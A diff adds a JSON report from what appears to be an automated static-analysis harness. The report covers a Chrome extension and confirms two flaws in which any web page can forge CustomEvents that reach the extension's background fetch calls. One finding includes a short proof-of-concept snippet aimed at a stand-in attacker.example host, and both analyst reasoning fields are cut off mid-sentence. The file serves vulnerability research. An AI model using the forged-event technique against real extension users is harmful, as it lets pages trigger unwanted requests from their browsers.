@@ -1,0 +1,188 @@
+{
+  "extension_id": "aiacepmnmgokkgjaplbbloiccdmmfcaa",
+  "extension_version": "16.32",
+  "browser": "chrome",
+  "provider": "deepseek",
+  "model": "deepseek-v4-pro",
+  "flow_count": 5,
+  "verified_count": 2,
+  "verdicts": [
+    {
+      "flow_index": 2,
+      "verdict": "TRUE_POSITIVE",
+      "confidence": 0.6,
+      "reasoning": "Structured extraction unavailable; explicit analyst conclusion preserved from the final static transcript: ## Verification of Flow #4 (TARGET_CUSTOM_EVENT → FETCH_RESOURCE)\n\n### 1. Source control — attacker-controlled\nThe content script `popup.js` (injected into `*://*/*`, all frames, isolated world) registers:\n\n```js\ndocument.addEventListener('RequestLink', function (evt) {\n    if (evt.detail != null) {          // L474 — reported anchor\n        requestLinkTemp = evt.detail;\n        RequestLinkFun()\n    }\n});\n```\n\nA page script can trivially forge this shared-DOM CustomEvent:\n\n```js\ndocument.dispatchEvent(new CustomEvent('RequestLink', {\n  detail: { url: 'https://attacker.example/', captcha: false, mid: 'x', mobile: false }\n}));\n```\n\n`RequestLinkFun()` then sends `requestLinkTemp.url` into the extension:\n\n```js\nurl = requestLinkTemp.url;                 // evt.detail.url\nchrome.runtime.sendMessage({\n  type: \"RequestLink\",\n  obj: url,                                // attacker URL\n  captcha, mid, incognito, mobile\n}, ...);\n```\n\nSo the source is genuinely page-controllable. The CustomEvent `detail` is the standard page-to-content-script bridge; no `sender.id`/origin trust is involved, and the content-script surface is wildcard.\n\n### 2. Source-to-sink path\nThe bridge is unbroken and the a",
+      "attacker_control": "See preserved static analyst transcript.",
+      "confirmed_path": "See preserved static analyst transcript.",
+      "false_positive_reason": "",
+      "partial_reason": "",
+      "pa_category": "",
+      "representative_index": null,
+      "report_disposition": "SUMMARY",
+      "source_report_id": 4,
+      "source_provenance": "CONTENT_SCRIPT",
+      "message_sender_provenance": "CONTENT_SCRIPT",
+      "privilege_reason": "sink grants capability beyond the source origin",
+      "report_evidence": {},
+      "harness_evidence": {
+        "version": "browser-extension-static-harness/v1",
+        "sourceReachability": {
+          "kind": "PAGE_TO_CONTENT_SCRIPT",
+          "browserFacts": "A page can forge window.postMessage/CustomEvent fields and mutate shared DOM values. event.source === window, same-page origin checks, and message action/type fields are not authentication."
+        },
+        "sourceAnchor": {
+          "reportedFile": "popup",
+          "reportedLoc": "L474:C8 -> L474:C18",
+          "resolvedFile": "popup.js",
+          "resolved": true,
+          "snippet": "L474 C8-18:     if (evt.detail != null) {"
+        },
+        "sinkAnchor": {
+          "reportedFile": "background",
+          "reportedLoc": "L28:C21 -> L28:C31",
+          "resolvedFile": "background.js",
+          "resolved": true,
+          "snippet": "L28 C21-31: \t\tconst resp = await fetch(url);"
+        },
+        "sourceExpectedMarkers": [
+          "addEventListener",
+          "detail"
+        ],
+        "contentScriptSurface": [
+          {
+            "matches": [
+              "*://*/*"
+            ],
+            "excludeMatches": [],
+            "js": [
+              "jquery.js",
+              "popup.js"
+            ],
+            "runAt": "document_start",
+            "allFrames": true,
+            "world": "ISOLATED"
+          }
+        ],
+        "externallyConnectable": null,
+        "authenticatedExtensionAllowlist": null,
+        "sinkClassification": {
+          "class": "SECURITY_RELEVANT",
+          "rule": "Confirm that attacker data reaches the actual URL/config/body/code/storage argument and is not replaced by a literal or browser-derived value."
+        },
+        "browserTrustRules": [
+          "sender.id is browser-populated and only a fixed-ID allowlist is an unforgeable inter-extension trust boundary.",
+          "event.origin/window.location.origin and message action/type fields are attacker-satisfiable in a page-to-content-script bridge.",
+          "chrome.action/browserAction badge, title, icon, and chrome.notifications UI state are extension/browser authority; attacker-controlled operative fields are TP, not harmless presentation. Verify the value reaches the API argument.",
+          "A source/sink match in an import statement, comment, dead code, or an unrelated action branch is not a data-flow proof.",
+          "For chrome.tabs.create/windows.create/downloads/fetch/WebSocket, verify that the tainted value controls the URL/body/options actually consumed by the API."
+        ],
+        "warnings": []
+      },
+      "verdict_basis": "Explicit labelled verdict recovered from the final static transcript after structured-output fallback.",
+      "dynamic_guidance": {
+        "triggerable": false,
+        "trigger_mechanism": "OTHER",
+        "injection_context": "",
+        "origin_requirement": "",
+        "trigger_surface": "",
+        "target_urls": [],
+        "payload_sketch": "",
+        "dom_forgery": "",
+        "beacon_pointable": false,
+        "beacon_param": "",
+        "observation": "",
+        "notes": ""
+      }
+    },
+    {
+      "flow_index": 4,
+      "verdict": "TRUE_POSITIVE",
+      "confidence": 0.6,
+      "reasoning": "Structured extraction unavailable; explicit analyst conclusion preserved from the final static transcript: ## Flow verification\n\n### Decision ledger\n\n**(a) Who controls the source?**\nA webpage. The manifest loads `popup.js` as a content script on `*://*/*`, `runAt: document_start`, all frames. In `popup.js`:\n\n```js\ndocument.addEventListener('AjaxLink', function (evt) {\n    var timeReq = setInterval(function () {\n        chrome.runtime.sendMessage({ type: \"PostRequest\", obj: evt.detail }, ...)\n```\n\nThe page can run `document.dispatchEvent(new CustomEvent('AjaxLink', {detail: {...}}))`, so `evt.detail` — including `url` and `data` — is fully attacker-controlled. There is no authentication, sender check, or origin check.\n\n**(b) Source-to-sink path**\nThe propagation is unbroken:\n\n1. `popup.js` L536/L538 — attacker-controlled `evt.detail` is sent as `{type:\"PostRequest\", obj: evt.detail}`.\n2. `background.js` L59 — `chrome.runtime.onMessage.addListener`.\n3. `background.js` L186 — `request.type == \"PostRequest\"` branch.\n4. `background.js` L187–188 — `linkUrl = request.obj.url`, `datajson = request.obj.data`.\n5. `background.js` L200 — `postUrl(linkUrl, datajson, ...)`.\n6. `background.js` L36–48 — `fetch(url, { ..., body: data })`.\n\nThe `request.type == \"PostRequest\"` check is attacker-satisfiab",
+      "attacker_control": "See preserved static analyst transcript.",
+      "confirmed_path": "See preserved static analyst transcript.",
+      "false_positive_reason": "",
+      "partial_reason": "",
+      "pa_category": "",
+      "representative_index": null,
+      "report_disposition": "SUMMARY",
+      "source_report_id": 5,
+      "source_provenance": "CONTENT_SCRIPT",
+      "message_sender_provenance": "CONTENT_SCRIPT",
+      "privilege_reason": "sink grants capability beyond the source origin",
+      "report_evidence": {},
+      "harness_evidence": {
+        "version": "browser-extension-static-harness/v1",
+        "sourceReachability": {
+          "kind": "PAGE_TO_CONTENT_SCRIPT",
+          "browserFacts": "A page can forge window.postMessage/CustomEvent fields and mutate shared DOM values. event.source === window, same-page origin checks, and message action/type fields are not authentication."
+        },
+        "sourceAnchor": {
+          "reportedFile": "popup",
+          "reportedLoc": "L538:C63 -> L538:C73",
+          "resolvedFile": "popup.js",
+          "resolved": true,
+          "snippet": "L538 C63-73:         chrome.runtime.sendMessage({ type: \"PostRequest\", obj: evt.detail }, function (response) {"
+        },
+        "sinkAnchor": {
+          "reportedFile": "background",
+          "reportedLoc": "L37:C1 -> L48:C3",
+          "resolvedFile": "background.js",
+          "resolved": true,
+          "snippet": ">>    37| \tfetch(url, {\n>>    38| \tmethod: 'POST',\n>>    39| \t mode: 'cors', // no-cors, *cors, same-origin\n>>    40|     cache: 'no-cache', // *default, no-cache, reload, force-cache, only-if-cached\n>>    41|     credentials: 'same-origin', // include, *same-origin, omit\n>>    42|     headers:{\n>>    43| \t\t\"Content-Type\":'application/json'\n>>    44| \t},\n>>    45|     redirect: 'follow', // manual, *follow, error\n>>    46|     referrerPolicy: 'no-referrer', // no-referrer, *no-referrer-when-downgrade, origin,\n>>    47| \t\tbody: data\n>>    48| \t}).then(function(resp){"
+        },
+        "sourceExpectedMarkers": [
+          "addEventListener",
+          "detail"
+        ],
+        "contentScriptSurface": [
+          {
+            "matches": [
+              "*://*/*"
+            ],
+            "excludeMatches": [],
+            "js": [
+              "jquery.js",
+              "popup.js"
+            ],
+            "runAt": "document_start",
+            "allFrames": true,
+            "world": "ISOLATED"
+          }
+        ],
+        "externallyConnectable": null,
+        "authenticatedExtensionAllowlist": null,
+        "sinkClassification": {
+          "class": "SECURITY_RELEVANT",
+          "rule": "Confirm that attacker data reaches the actual URL/config/body/code/storage argument and is not replaced by a literal or browser-derived value."
+        },
+        "browserTrustRules": [
+          "sender.id is browser-populated and only a fixed-ID allowlist is an unforgeable inter-extension trust boundary.",
+          "event.origin/window.location.origin and message action/type fields are attacker-satisfiable in a page-to-content-script bridge.",
+          "chrome.action/browserAction badge, title, icon, and chrome.notifications UI state are extension/browser authority; attacker-controlled operative fields are TP, not harmless presentation. Verify the value reaches the API argument.",
+          "A source/sink match in an import statement, comment, dead code, or an unrelated action branch is not a data-flow proof.",
+          "For chrome.tabs.create/windows.create/downloads/fetch/WebSocket, verify that the tainted value controls the URL/body/options actually consumed by the API."
+        ],
+        "warnings": []
+      },
+      "verdict_basis": "Explicit labelled verdict recovered from the final static transcript after structured-output fallback.",
+      "dynamic_guidance": {
+        "triggerable": false,
+        "trigger_mechanism": "OTHER",
+        "injection_context": "",
+        "origin_requirement": "",
+        "trigger_surface": "",
+        "target_urls": [],
+        "payload_sketch": "",
+        "dom_forgery": "",
+        "beacon_pointable": false,
+        "beacon_param": "",
+        "observation": "",
+        "notes": ""
+      }
+    }
+  ],
+  "unreviewed_flow_indices": [],
+  "reused_flow_indices": [],
+  "summary": "Verified 2 flow(s): 2 true-positive, 0 false-positive, 0 partial-available (PA), 0 uncertain, 0 duplicate; 0 flagged triggerable for dynamic testing."
+}
